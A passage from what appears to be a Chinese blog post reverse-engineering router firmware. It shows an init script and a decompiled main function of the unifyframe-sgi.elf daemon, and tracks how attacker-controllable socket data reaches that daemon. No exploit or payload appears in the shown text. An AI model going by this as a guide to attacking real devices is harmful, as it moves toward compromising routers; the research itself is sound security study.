Socket，SOCK_DGRAM）</strong>：<ul><li>使用 UDP（用户数据报协议）进行通信。</li><li>提供不可靠的、无连接的消息传递服务。</li><li>适用于对实时性要求较高、但对数据传输可靠性要求较低的应用，例如 DNS 查询、视频流等。</li></ul></li></ol></blockquote><p>分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uf_socket_msg_write(v41, v40, v46);</span><br></pre></td></tr></table></figure><p>这里有一个uf_socket_msg_write，而winmt师傅猜测因为这里有write，v41是socket的标识符，v40又指向的是我们可控字段的指针，因此这里一定在进程有一个uf_socket_msg_read与它互相接收信息</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405300037164.png" alt="image-20240527202423205"></p><p>再通过&#x2F;etc&#x2F;init.d&#x2F;中也有一个unifyframe-sgi.elf的初始化文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh /etc/rc.common</span></span><br><span class="line"></span><br><span class="line">START=19</span><br><span class="line">STOP=99             <span class="comment">#优先级</span></span><br><span class="line"></span><br><span class="line">PROG=/usr/sbin/unifyframe-sgi.elf</span><br><span class="line">PROG_1=/usr/sbin/uf_ubus_call.elf</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$IPKG_INSTROOT</span>/lib/functions/procd.sh&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    USE_PROCD=1</span><br><span class="line">    <span class="function"><span class="title">start_service</span></span>() &#123;</span><br><span class="line">        <span class="built_in">rm</span> -rf /tmp/uniframe_sgi/lib_uf_server.sock*</span><br><span class="line">        <span class="built_in">rm</span> -rf /tmp/uniframe_sgi/lib_uf_client.sock*</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Starting <span class="variable">$PROG</span> ...&quot;</span></span><br><span class="line">        procd_open_instance</span><br><span class="line">        procd_set_param <span class="built_in">command</span> <span class="variable">$PROG</span></span><br><span class="line">        procd_set_param respawn</span><br><span class="line">        procd_close_instance</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Starting <span class="variable">$PROG_1</span> ...&quot;</span></span><br><span class="line">        procd_open_instance</span><br><span class="line">        procd_set_param <span class="built_in">command</span> <span class="variable">$PROG_1</span></span><br><span class="line">        procd_set_param respawn</span><br><span class="line">        procd_close_instance</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">reload_service</span></span>() &#123;</span><br><span class="line">        restart <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    SERVICE_DAEMONIZE=1</span><br><span class="line">    <span class="function"><span class="title">start</span></span>() &#123;</span><br><span class="line">        <span class="built_in">rm</span> -rf /tmp/uniframe_sgi/lib_uf_server.sock*</span><br><span class="line">        <span class="built_in">rm</span> -rf /tmp/uniframe_sgi/lib_uf_client.sock*</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Starting <span class="variable">$PROG</span> ...&quot;</span></span><br><span class="line">        service_start <span class="variable">$PROG</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Starting <span class="variable">$PROG_1</span> ...&quot;</span></span><br><span class="line">        service_start <span class="variable">$PROG_1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">stop</span></span>() &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Stop <span class="variable">$PROG</span> ...&quot;</span></span><br><span class="line">        service_stop <span class="variable">$PROG</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Stop <span class="variable">$PROG_1</span> ...&quot;</span></span><br><span class="line">        service_stop <span class="variable">$PROG_1</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因此就此可以确认unifyframe-sgi.elf文件就是与本文件的write进行交流的文件，因此着重分析一下unifyframe-sgi.elf文件</p><p>从main函数分析起</p><h3 id="unifyframe-sgi-elf"><a href="#unifyframe-sgi-elf" class="headerlink" title="unifyframe-sgi.elf"></a>unifyframe-sgi.elf</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> *v10; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// $v0</span></span><br><span class="line">  BOOL v17; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> *v19; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> *v20; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> client; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> *v27; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *sock; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// $a0</span></span><br><span class="line">  _DWORD *addr; <span class="comment">// $s0</span></span><br><span class="line">  _DWORD *v32; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *method; <span class="comment">// $s6</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// $a0</span></span><br><span class="line">  _DWORD *v38; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v39; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v40; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v41; <span class="comment">// $s6</span></span><br><span class="line">  _DWORD *v42; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v43[<span class="number">28</span>]; <span class="comment">// [sp+30h] [-C0h] BYREF</span></span><br><span class="line">  __int16 v44[<span class="number">2</span>]; <span class="comment">// [sp+A0h] [-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// [sp+A4h] [-4Ch]</span></span><br><span class="line">  <span class="type">int</span> v46; <span class="comment">// [sp+A8h] [-48h]</span></span><br><span class="line">  <span class="type">char</span> v47[<span class="number">4</span>]; <span class="comment">// [sp+C4h] [-2Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v48[<span class="number">8</span>]; <span class="comment">// [sp+C8h] [-28h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *v49; <span class="comment">// [sp+D0h] [-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+D4h] [-1Ch]</span></span><br><span class="line">  _DWORD *aa; <span class="comment">// [sp+D8h] [-18h]</span></span><br><span class="line">  <span class="type">int</span> v52; <span class="comment">// [sp+DCh] [-14h]</span></span><br><span class="line">  __int16 *v53; <span class="comment">// [sp+E0h] [-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v54; <span class="comment">// [sp+E4h] [-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v55; <span class="comment">// [sp+E8h] [-8h]</span></span><br><span class="line"></span><br><span class="line">  mkdir(<span class="string">&quot;/tmp/uniframe_sgi&quot;</span>, <span class="number">511</span>, envp);        <span class="comment">// 创建文件夹</span></span><br><span class="line">  v49 = v43;</span><br><span class="line">  <span class="built_in">memset</span>(v43, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v43, <span class="string">&quot;/tmp/sgi&quot;</span>);</span><br><span class="line">  <span class="built_in">strcat</span>(v43, <span class="string">&quot;.sgi_ufm&quot;</span>);</span><br><span class="line">  v5 = open(v43, <span class="number">770</span>, <span class="number">438</span>);</span><br><span class="line">  dword_435660 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *(_DWORD *)_errno_location();</span><br><span class="line">    v7 = strerror(v6);</span><br><span class="line">    v8 = v6;</span><br><span class="line">    v9 = <span class="string">&quot;Failed to open file %s, errno=%d, %s.&quot;</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="built_in">printf</span>(v9, <span class="string">&quot;.sgi_ufm&quot;</span>, v8, v7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v44[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  v45 = <span class="number">0</span>;</span><br><span class="line">  v44[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  v53 = v44;</span><br><span class="line">  <span class="keyword">if</span> ( fcntl(v5, <span class="number">6</span>, v44) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (<span class="type">int</span> *)_errno_location();</span><br><span class="line">    <span class="keyword">if</span> ( *v10 == <span class="number">13</span> || *v10 == <span class="number">11</span> )</span><br><span class="line">      close(dword_435660);</span><br><span class="line">    v11 = *v10;</span><br><span class="line">    v7 = strerror(v11);</span><br><span class="line">    v8 = v11;</span><br><span class="line">    v9 = <span class="string">&quot;Failed to lock file %s, errno=%d, %s.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  reserve_record();</span><br><span class="line">  reserve_core();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = getopt(argc, argv, &amp;dword_41FF6C);</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)open debug mode!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="number">1566</span>);</span><br><span class="line">      g_debug = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v13 == <span class="number">104</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;unifyframe-sgi.elf:&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;-h : show help message &quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;-d: open debug mode&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sem_init(&amp;unk_435E3C, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  openlog(<span class="string">&quot;unifyframe-sgi&quot;</span>, <span class="number">3</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !ufm_init() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( uf_ubus_init() )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)uf_ubus_init failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v43[<span class="number">1</span>] = (<span class="type">int</span>)handle_pipe;</span><br><span class="line">    sigemptyset(&amp;v43[<span class="number">2</span>]);</span><br><span class="line">    v43[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    sigaction(<span class="number">13</span>, v43, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sgi_mgr_init(&amp;g_sgi_client_mgr) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = uf_socket_server_init(<span class="number">20</span>);</span><br><span class="line">      v15 = v14;</span><br><span class="line">      <span class="keyword">if</span> ( v14 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( uf_cmd_task_init() )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">        <span class="keyword">if</span> ( uf_create_detached_thread(v48, sub_405418, <span class="number">0</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = <span class="number">1608</span>;</span><br><span class="line">LABEL_27:</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)create thread failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>, v16);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( uf_create_detached_thread(v47, sub_40715C, <span class="number">0</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = <span class="number">1613</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)init ok&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="number">1617</span>);</span><br><span class="line">        signal(<span class="number">18</span>, handler);</span><br><span class="line">        uf_redirect();</span><br><span class="line">        v52 = <span class="number">1</span> &lt;&lt; v15;</span><br><span class="line">        v54 = <span class="number">4</span> * ((<span class="type">unsigned</span> <span class="type">int</span>)v15 &gt;&gt; <span class="number">5</span>);</span><br><span class="line">        v55 = &amp;g_fd_set[v54 / <span class="number">4</span>];</span><br><span class="line">        v17 = v15 &lt; <span class="number">0</span>;</span><br><span class="line">LABEL_31:</span><br><span class="line">        v18 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v17 )</span><br><span class="line">          v18 = v15;</span><br><span class="line">        i = v18;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v19 = g_fd_set;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">            *v19++ = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( v19 != (<span class="type">int</span> *)&amp;g_test_mutex );</span><br><span class="line">          *v55 |= v52;</span><br><span class="line">          fbss = i;</span><br><span class="line">          pthread_mutex_lock(&amp;unk_436370);</span><br><span class="line">          v20 = (<span class="type">int</span> *)(dword_436364 - <span class="number">12</span>);</span><br><span class="line">          v21 = *(_DWORD *)dword_436364 - <span class="number">12</span>;</span><br><span class="line">          <span class="keyword">while</span> ( v20 + <span class="number">3</span> != &amp;dword_436364 )</span><br><span class="line">          &#123;</span><br><span class="line">            pthread_mutex_lock(v20 + <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> ( *v20 != <span class="number">-1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              g_fd_set[(<span class="type">unsigned</span> <span class="type">int</span>)*v20 &gt;&gt; <span class="number">5</span>] |= <span class="number">1</span> &lt;&lt; *v20;</span><br><span class="line">              v22 = *v20;</span><br><span class="line">              <span class="keyword">if</span> ( fbss &gt;= *v20 )</span><br><span class="line">                v22 = fbss;</span><br><span class="line">              fbss = v22;</span><br><span class="line">            &#125;</span><br><span class="line">            pthread_mutex_unlock(v20 + <span class="number">5</span>);</span><br><span class="line">            v20 = (<span class="type">int</span> *)v21;</span><br><span class="line">            v21 = *(_DWORD *)(v21 + <span class="number">12</span>) - <span class="number">12</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          pthread_mutex_unlock(&amp;unk_436370);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( select(fbss + <span class="number">1</span>, g_fd_set, <span class="number">0</span>, <span class="number">0</span>) &lt;= <span class="number">0</span> );</span><br><span class="line">        <span class="keyword">if</span> ( (v52 &amp; g_fd_set[v54 / <span class="number">4</span>]) == <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">        <span class="keyword">if</span> ( g_sgi_client_mgr &gt;= <span class="number">100</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)connect is full %d\n&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="number">1646</span>, v15);</span><br><span class="line">          sleep(<span class="number">1</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_94;</span><br><span class="line">        &#125;</span><br><span class="line">        v23 = accept(v15, v43, v44);</span><br><span class="line">        v24 = v23;</span><br><span class="line">        <span class="keyword">if</span> ( v23 &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)accept a client filed![%d]&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;sgi_accept_client&quot;</span>, <span class="number">1391</span>, v23);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">        &#125;</span><br><span class="line">        client = sgi_mgr_get_client(v23);</span><br><span class="line">        <span class="keyword">if</span> ( client )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)get a client from list %d&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;sgi_accept_client&quot;</span>, <span class="number">1397</span>, v24);</span><br><span class="line">          *(_DWORD *)(client + <span class="number">48</span>) = <span class="number">20</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">        &#125;</span><br><span class="line">        v26 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">52</span>);</span><br><span class="line">        v27 = (<span class="type">int</span> *)v26;</span><br><span class="line">        <span class="keyword">if</span> ( v26 )</span><br><span class="line">        &#123;</span><br><span class="line">          v28 = v26 + <span class="number">4</span>;</span><br><span class="line">          v27[<span class="number">2</span>] = v28;</span><br><span class="line">          v27[<span class="number">1</span>] = v28;</span><br><span class="line">          <span class="keyword">if</span> ( !pthread_mutex_init(v27 + <span class="number">5</span>, <span class="number">0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v27[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">            *v27 = v24;</span><br><span class="line">            v27[<span class="number">12</span>] = <span class="number">20</span>;</span><br><span class="line">            ((<span class="type">void</span> (__fastcall *)(<span class="type">int</span> *))sgi_mgr_add_client)(v27);</span><br><span class="line">LABEL_58:</span><br><span class="line">            pthread_mutex_lock(&amp;unk_436370);</span><br><span class="line">            sock = (_DWORD *)(dword_436364 - <span class="number">12</span>);</span><br><span class="line">            <span class="keyword">for</span> ( i = *(_DWORD *)dword_436364 - <span class="number">12</span>; ; i = *(_DWORD *)(v30 + <span class="number">12</span>) - 